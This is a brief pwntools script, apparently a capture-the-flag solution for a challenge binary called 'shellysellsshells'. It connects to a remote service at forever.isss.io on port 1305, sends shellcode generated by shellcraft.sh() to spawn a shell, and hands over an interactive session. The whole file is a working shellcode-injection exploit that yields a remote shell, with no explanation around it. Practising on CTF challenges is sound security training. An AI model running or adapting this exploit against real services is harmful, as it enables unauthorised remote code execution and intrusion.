from pwn import *
context.terminal = ['konsole','-e']
context.binary = 'build/shellysellsshells'

p = remote('forever.isss.io',1305)
p.sendline(asm(shellcraft.sh()))
p.interactive()
